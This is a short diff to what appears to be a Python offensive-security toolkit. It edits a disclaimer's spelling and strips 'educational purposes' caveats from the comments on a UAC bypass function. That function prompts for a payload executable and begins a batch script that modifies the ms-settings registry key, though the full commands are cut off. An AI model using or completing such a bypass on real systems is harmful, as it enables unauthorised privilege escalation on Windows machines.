@@ -28,7 +28,7 @@ def display_disclaimer():
     DISCLAIMER:
     This script is intended for educational purposes only. It is not intended to cause any harm or damage.
     You must have explicit permission from the owner of any system you target with this script.
-    Unauthorized testing and exploitation of systems is illegal and unethical.
+    Unauthorised testing and exploitation of systems is illegal and unethical.
     Always ensure you have written consent before conducting any security testing.
     
     """)
@@ -96,7 +96,7 @@ def install_dependencies():
     # subprocess.run(["sudo", "gvm-check-setup"])
     # print("[INFO] OpenVAS (GVM) installation completed.")
 
-# Function to perform a UAC bypass (example, use responsibly and ethically)
+# Function to perform a UAC bypass
 def uac_bypass():
     payload_path = input("[INPUT] Enter the path to the payload executable (e.g., C:\\path\\to\\payload.exe): ").strip()
 
@@ -105,7 +105,7 @@ def uac_bypass():
         print("[ERROR] No payload path provided. Please enter a valid path to the executable.")
         return
 
-    # Example of a simple UAC bypass technique using a registry modification (for educational purposes only)
+    # Example of a simple UAC bypass technique using a registry modification
     uac_bypass_script = f'''
     @echo off
     rem Add registry entry to change the behavior of ms-settings
